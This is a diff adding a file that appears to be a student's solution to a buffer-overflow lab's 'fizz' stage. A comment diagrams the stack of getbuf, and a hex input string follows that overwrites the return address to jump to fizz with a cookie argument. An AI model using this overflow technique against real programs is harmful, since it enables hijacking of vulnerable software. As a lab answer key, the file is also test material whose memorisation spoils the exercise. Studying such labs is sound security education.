@@ -1,0 +1,26 @@
+/*
+ stack of <getbuf>:
+                          ......
+ return address     <-- |--------|   0x0
+ old EBP(in getbuf) <-- |--------|  -0x4
+                        |--------|
+                          ......
+ string             <-- |--------| -0x2C
+                          ......
+ The target is to make EIP the address of <fizz>
+ and pass my unique Cookie(0x31 A8 15 5B) to it.
+
+ <fizz> function address: 0x08 04 8C BA
+
+ After getting in the <fizz>, the stack is as shown below:
+                        ......
+ parameter val    <-- |--------|   0x4
+ return address   <-- |--------|   0x0 --> no need to fill in
+ old EBP(in fizz) <-- |--------|  -0x4
+                        ......
+ So the string will be 0x28 + 0x4 + 0x4 + 0x4 = 0x34(52),
+ 0x29 - 0x2C: BA 8C 04 08
+ 0x31 - 0x34: 5B 15 A8 31
+ */
+
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 BA 8C 04 08 00 00 00 00 5B 15 A8 31
